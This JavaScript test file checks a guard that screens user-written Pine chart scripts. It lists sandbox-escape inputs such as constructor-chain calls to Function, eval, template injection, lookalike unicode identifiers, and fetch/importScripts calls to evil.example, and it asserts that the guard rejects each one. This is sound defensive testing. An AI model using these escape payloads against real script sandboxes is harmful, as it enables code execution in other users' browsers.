// Test: assets/chart-pine-guard.js (shared-script safety check).
// node tools/tests/chart-pine-guard.test.js            -> attack cases + fixtures
// PINETS=/path/to/node_modules/pinets node ... (optional) also runs every source the
// guard ACCEPTS through real PineTS with a tripwire global, to prove none escape.
'use strict';
const fs = require('fs');
const path = require('path');
const G = require('../../assets/chart-pine-guard.js');
const H = '//@version=5\nindicator("t")\n';
const ATTACKS = {
  plain_global_call: 'pwn("plain")\nplot(close)',
  global_assign: 'x = pwn\nx("viaVar")\nplot(close)',
  globalThis: 'globalThis.pwn("gt")\nplot(close)',
  self: 'self.pwn("self")\nplot(close)',
  constructor_chain: 'f = close.constructor.constructor("globalThis.pwn(1)")\nf()\nplot(close)',
  str_ctor: 's = "a"\nf = s.constructor.constructor("globalThis.pwn(1)")\nf()\nplot(close)',
  proto: 'p = ta.__proto__\nplot(close)',
  eval: 'eval("globalThis.pwn(1)")\nplot(close)',
  Function: 'Function("globalThis.pwn(1)")()\nplot(close)',
  str_unicode: 's = "\\u0022); pwn(1); (\\u0022"\nplot(close)',
  str_hex: 's = "\\x22"\nplot(close)',
  template: 's = `${pwn(1)}`\nplot(close)',
  tpl_in_string: 's = "${pwn(1)}"\nplot(close)',
  import_kw: 'import user/lib/1 as l\nplot(close)',
  fetch: 'fetch("https://evil.example/x")\nplot(close)',
  method_def_body: 'f(x) => globalThis.pwn("fn")\nf(1)\nplot(close)',
  named_arg_declare: 'plot(close, eval=1)\neval("pwn(1)")',
  named_arg_context: 'plot(close, context=1)\ncontext.data',
  declare_eval: 'eval = 1\nplot(close)',
  tuple_declare: '[pwn2, b] = [1, 2]\nplot(close)\nx = indexedDB',
  member_call: 'f = ta.sma.call(1)\nplot(close)',
  apply_member: 'f = ta.sma.apply(1)\nplot(close)',
  dollar: 'x = $.data\nplot(close)',
  unicode_ident: 'x\u0430 = 1\nplot(close)',
  fullwidth: 'ｅval("1")',
  semicolon: 'x = 1; pwn(1)',
  braces: 'x = {a: 1}',
  backslash_code: 'x = 1 \\\nplot(close)',
  dunder: 'x = __defineGetter__\nplot(close)',
  free_unknown: 'x = postMessage\nplot(close)',
  set_timeout: 'setTimeout("pwn(1)", 0)',
  importScripts: 'importScripts("https://evil.example/x.js")',
  worker_location: 'x = navigator.userAgent',
  this_kw: 'x = this\nplot(close)',
};
let fails = 0;
for (const [name, body] of Object.entries(ATTACKS)) {
  const r = G.check(H + body);
  if (r.ok) { fails++; console.log('FAIL (accepted attack)', name); }
}
console.log('attacks rejected:', Object.keys(ATTACKS).length - fails, '/', Object.keys(ATTACKS).length);

// Legit scripts must pass: our examples + fixtures (except the deliberately broken ones).
const ex = [];
const fx = path.join(__dirname, 'fixtures/pine');
const walk = (d) => fs.readdirSync(d).forEach((f) => { const p = path.join(d, f); if (fs.statSync(p).isDirectory()) walk(p); else if (/\.pine$/.test(f)) ex.push([path.relative(fx, p), fs.readFileSync(p, 'utf8')]); });
walk(fx);
global.window = {};
require('../../assets/chart-pine-scripts.js');
(global.window.StrykerPineScripts ? global.window.StrykerPineScripts.EXAMPLES : []).forEach((x) => ex.push([x.id, x.source]));
let legitBad = 0;
for (const [n, s] of ex) {
  if (/^broken-/.test(path.basename(n))) continue;
  const r = G.check(s);
  if (!r.ok) { legitBad++; console.log('REJECTED legit', n, 'line', r.line, r.msg); }
}
console.log('legit accepted:', ex.filter(([n]) => !/^broken-/.test(path.basename(n))).length - legitBad, '/', ex.filter(([n]) => !/^broken-/.test(path.basename(n))).length);
if (fails) process.exit(1);
